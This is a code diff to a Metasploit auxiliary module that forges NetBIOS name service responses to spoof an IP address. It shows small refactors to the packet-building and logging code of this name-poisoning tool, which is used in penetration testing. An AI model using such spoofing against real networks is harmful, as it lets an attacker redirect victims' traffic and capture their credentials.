@@ -57,7 +57,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def dispatch_request(packet, rhost, src_port)
     rhost = ::IPAddr.new(rhost)
-     # `recvfrom` (on Linux at least) will give us an ipv6/ipv4 mapped
+    # `recvfrom` (on Linux at least) will give us an ipv6/ipv4 mapped
     # addr like "::ffff:192.168.0.1" when the interface we're listening
     # on has an IPv6 address. Convert it to just the v4 addr
     if rhost.ipv4_mapped?
@@ -88,7 +88,7 @@ class Metasploit3 < Msf::Auxiliary
 
     return unless nbnsq_decodedname =~ /#{datastore['REGEX']}/i
 
-    vprint_good("#{rhost.ljust 16} nbns - #{nbnsq_decodedname} matches regex, responding with #{datastore["SPOOFIP"]}")
+    vprint_good("#{rhost.ljust 16} nbns - #{nbnsq_decodedname} matches regex, responding with #{spoof}")
 
     if datastore['DEBUG']
       print_status("transid:        #{nbnsq_transid.unpack('H4')}")
@@ -118,7 +118,7 @@ class Metasploit3 < Msf::Auxiliary
       "\x00\x04\x93\xe0" + # TTL = a long ass time
       "\x00\x06" + # Datalength = 6
       "\x00\x00" + # Flags B-node, unique = whatever that means
-      datastore['SPOOFIP'].split('.').collect(&:to_i).pack('C*')
+      spoof.hton
 
     pkt = PacketFu::UDPPacket.new
     pkt.ip_saddr = Rex::Socket.source_address(rhost)
